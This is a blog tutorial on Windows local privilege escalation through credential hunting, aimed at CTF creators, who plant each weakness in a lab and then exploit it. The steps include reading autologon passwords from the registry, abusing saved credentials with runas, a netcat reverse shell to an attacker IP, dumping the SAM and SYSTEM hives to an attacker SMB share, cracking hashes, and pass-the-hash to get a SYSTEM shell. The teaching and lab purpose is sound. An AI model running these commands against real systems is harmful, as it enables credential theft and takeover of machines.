---
title: Windows Local Privilege Escalation - Credential Hunting for CTF Creators
draft: false
author: "pwnlog"
authorLink: ""
description: "Windows Local Privilege Escalation - Credential Hunting"
license: ""
images: []
date: 2022-03-20 11:33:00 +0800
categories: [Windows Local Privilege Escalation]
tags: [credential hunting, plain-text files, answer files, windows credential manager, ask for credentials, local privilege escalation, windows]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: false
rssFullText: false

code:
  copy: true
  maxShownLines: -1
  # ...
math:
  enable: true
  # ...
mapbox:
  accessToken: ""
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...

summary: "I know you are storing those cr3ds in s3cr3ts but are you really? (\\*_\\*)"
---


# Credential Hunting

Credential hunting is the practice of finding credentials in a system. These can either be encrypted, encoded, or in plain text. 

## Autologon

We're gonna add the autologon user to the registry, we need a command prompt or a PowerShell console running as **administrator**:

```powershell
C:\Windows\system32>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "DefaultUsername" /t REG_SZ /d user /f >nul
C:\Windows\system32>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "DefaultPassword" /t REG_SZ /d con321 /f >nul
C:\Windows\system32>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "AutoAdminLogon" /t REG_SZ /d 1 /f >nul
C:\Windows\system32>
```

As an attacker from a medium-integrity level console, we can enumerate these credentials with:

```powershell
C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Default*"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultUsername    REG_SZ    user
    DefaultPassword    REG_SZ    con321

End of search: 2 match(es) found.
```

### Credentials Manager / Windows Vault

The Windows [Credentials Manager](https://docs.microsoft.com/en-us/windows/win32/secauthn/credential-manager) is a windows vault that stores user credentials for servers, websites and other programs that **Windows** can **log in the users automatically**. These credentials can be used by Windows to log in to the users automatically, which means that any **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager**. I recommend reading this [article](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault/).

{{< image src="/images/posts/windows-credential-manager.png" caption="Windows Credential Manager " src_s="/images/posts/windows-credential-manager.png" src_l="/images/posts/windows-credential-manager.png" >}}

Basically, the Credential Manager is used by the Windows operating system to store the credentials of applications or addresses such as URLs. This information can be used on local machines, systems on the network/intranet, or even services on the internet such as web services. 

The Credential Manager has two main types of credentials:
- **Web Credentials**: Stores websites credentials.
- **Windows Credentials**: 
	- **Windows Credentials**: Stores logon credentials such as (Interactive logon)
	- **Certificate-Based Credentials**: Stores credentials of certificates
	- **Generic Credentials**: Stores credentials of applications and internet/network addresses.

Let's startup by adding a Window credential of a local user, in this case, the Administrator user:

{{< image src="/images/posts/admin-credential-manager.png" caption="Admin Credential Manager " src_s="/images/posts/admin-credential-manager.png" src_l="/images/posts/admin-credential-manager.png" >}}

> Note: Verify that the Internet or network address is set to your `COMPUTER_NAME\admin` and that the User name field has the syntax `YOUR_COMPUTER_NAME\Administrator` and make sure that the password is correct.  

Using the cmdkey we can see the stored credentials:

```powershell
C:\Users\user>cmdkey /list

Currently stored credentials:

    Target: MicrosoftAccount:target=SSO_POP_Device
    Type: Generic
    User: 02erabxflqezalbj
    Saved for this logon only

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02erabxflqezalbj
    Local machine persistence

    Target: Domain:interactive=desktop-bn\admin
    Type: Domain Password
    User: desktop-bn\Administrator
```

Using the `runas /savecred`:

- /savecred: is used to use credentials previously saved by the user.
- /user: the user to runas

Essentially, Windows will go to the credential manager and check for the administrator user and use its password:

```powershell
C:\Users\user>runas /savecred /user:admin cmd.exe
Attempting to start cmd.exe as user "desktop-bn\admin" ...
```

However, this spawns the `cmd.exe` process as Administrator with High-Integrity Level:

```powershell
C:\Windows\system32>whoami /all

USER INFORMATION
----------------

User Name                     SID
============================= ============================================
desktop-bn\administrator S-1-5-21-264094270-2388996790-3434637240-500


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Performance Log Users                                 Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288


<SNIP>
```

We could also try to execute commands as the Administrator user:

```powershell
C:\Users\user>runas /savecred /user:admin "C:\windows\system32\cmd.exe /c dir /b /a /s C:\Users\Administrator > C:\Tools\admin.txt"
Attempting to start C:\windows\system32\cmd.exe /c dir /b /a /s C:\Users\Administrator > C:\Tools\admin.txt as user "desktop-bn\admin" ...

C:\Users\user>type C:\Tools\admin.txt
C:\Users\Administrator\AppData
C:\Users\Administrator\Application Data
```

The following example is calling a remote binary via an SMB share.

```powershell
C:\Users\user>runas /savecred /user:admin "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Using `runas` with a provided set of credentials we can try a executing reverse shell as Administrator:

```powershell
C:\Users\user>runas /savecred /user:admin "C:\Tools\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

### Extracting Credentials from the Credential Manager

Tools such as [mimikatz](https://github.com/gentilkiwi/mimikatz), [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), and [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) can help you extract credentials from the Windows Credential Manager.

This section covers the following escalation paths:

- Non-Admin Medium Integrity Level (No Password) -> Non-Admin Medium Integrity Level Password
- Admin Medium Integrity Level (No Password) -> Admin Medium Integrity Level Password

## Plain-Text Credentials

Add a simple plain-text file containing a password:

```powershell
C:\Users\user> echo 'Administrator con123' > C:\Users\user\Documents\passwords.txt
```

Then from an attacker's perspective, let's search all the files in the `C:\` drive:

```powershell
C:\Users\user>dir /b /a /s C:\ > cdirs.txt
```

The command above has the following attributes:

- /b: Uses bare format (no heading information or summary).
- /a: Displays files with specified attributes.
- /s: Displays files in specified directory and all subdirectories.

Filter for files containing the following string (passw):

```powershell
C:\Users\user>type cdirs.txt | findstr /i passw
<...SNIP...>
C:\Users\user\Documents\passwords.txt
<...SNIP...>
```

We found a clear-text password filename:

```powershell
C:\Users\user>type C:\Users\user\Documents\passwords.txt
Administrator con123
```

We should also try to enumerate network shares or other disk mounts:

```powershell
net use
```

### Answer Files (Unattend/ed.xml)

According to the [official documentation](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs?view=windows-11), the answer files are described as:

> Answer files (or Unattend files) can be used to modify Windows settings in your images during Setup. You can also create settings that trigger scripts in your images that run after the first user creates their account and picks their default language.

Another important detail is the following:

> Windows Setup will automatically search for [answer files in certain locations](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-setup-automation-overview?view=windows-11#implicit-answer-file-search-order), or you can specify an unattend file to use by using the `/unattend:` option when [running Windows Setup (setup.exe)](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-setup-command-line-options?view=windows-11#unattend).

As stated above, the answer files can be written in different locations, here is a general template that we can use:

```powershell
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

This is an example of the content of an `Unattended.xml` file:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>Uxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

Noticed that there is a password field:

```xml
<Password>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</Password>
```

We can decode this base64 string and gather the password in plain text:

```shell
echo 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' | base64 -d
```

I won't recreate a scenario of this since this happens during the Windows Setup.

## SAM & SYSTEM Backups

The SAM and SYSTEM backups are usually stored in the following locations:

```bash
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM

%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

We're gonna create a backup of the SAM and SYSTEM files; to do this we must run it from an **administrator** command prompt or PowerShell console:

```powershell
C:\Windows\system32>reg save hklm\sam c:\sam
The operation completed successfully.

C:\Windows\system32>reg save hklm\system c:\system
The operation completed successfully.
```

Let's verify if we have access to these files as a low-privileged user:

```powershell
C:\Windows\system32>icacls C:\sam
C:\sam BUILTIN\Administrators:(I)(F)
       NT AUTHORITY\SYSTEM:(I)(F)
       BUILTIN\Users:(I)(RX)
       NT AUTHORITY\Authenticated Users:(I)(M)
       Mandatory Label\High Mandatory Level:(I)(NW)

Successfully processed 1 files; Failed processing 0 files

C:\Windows\system32>icacls C:\system
C:\system BUILTIN\Administrators:(I)(F)
          NT AUTHORITY\SYSTEM:(I)(F)
          BUILTIN\Users:(I)(RX)
          NT AUTHORITY\Authenticated Users:(I)(M)
          Mandatory Label\High Mandatory Level:(I)(NW)

Successfully processed 1 files; Failed processing 0 files
```

We do have access as we can see in this line:

```powershell
NT AUTHORITY\Authenticated Users:(I)(M)
```

As we can see we're part of this group:

```powershell
PS C:\Tools> whoami /groups | findstr /i authenticated
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
```

Setup an SMB share with credentials on your host:

```shell
❯ sudo impacket-smbserver share . -smb2support -username low -password 'p@ssw0rd'
[sudo] password for kali:
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Transfer the SAM and SYSTEM files to your attacker VM:

```powershell
PS C:\Users\user> $pass = ConvertTo-SecureString 'p@ssw0rd' -AsPlainText -Force

PS C:\Users\user> $cred = New-Object System.Management.Automation.PSCredential('low', $pass)

PS C:\Users\user> New-PSDrive -Name "share" -PSProvider "FileSystem" -Root "\\192.168.119.130\share" -Credential $cred
```

Transfer the files to your host:

```powershell
PS C:\> cp C:\sam  \\192.168.119.130\share
PS C:\> cp C:\system \\192.168.119.130\share
```

Now we have transferred these files to the attacker host:

```shell
❯ ls -l sam
.rwxr-xr-x root root 48 KB Tue Mar  8 17:48:37 2022  sam
❯ ls -l system
.rwxr-xr-x root root 12 MB Tue Mar  8 17:49:40 2022  system
```

Use secretsdump from impacket to dump out the hashes from the SAM and SYSTEM files:

```shell
❯ impacket-secretsdump -sam sam -system system LOCAL
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb:::
Guest:501:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
DefaultAccount:503:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
WDAGUtilityAccount:504:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
user:1001:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
[*] Cleaning up...
```

Save the hash and the password to a file:

```shell
❯ echo 'a9a46a3fc0b4efcd2baf566ffe2a209b' > hash.txt
❯ echo 'con123' > pass.txt
```

With that we can simulate a dictionary attack of the Administrator user NTLM hash using hashcat:

```shell
❯ hashcat -m 1000 --force hash.txt pass.txt
hashcat (v6.1.1) starting...

<...SNIP...>

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:con123

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Time.Started.....: Tue Mar  8 18:05:45 2022, (0 secs)
Time.Estimated...: Tue Mar  8 18:05:45 2022, (0 secs)
Guess.Base.......: File (pass.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       21 H/s (0.00ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: con123 -> con123
```

Now we can use the cracked password to log in as the Administrator user.

Alternatively, we can use the hash to perform a Pass-The-Hash attack that will spawn a shell running as administrator without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:

```shell
❯ impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxx' Administrator@192.168.119.129

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 192.168.119.129.....
[*] Found writable share ADMIN$
[*] Uploading file vlAbGeHR.exe
[*] Opening SVCManager on 192.168.119.129.....
[*] Creating service zKiJ on 192.168.119.129.....
[*] Starting service zKiJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.22000.493]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384


<SNIP>
```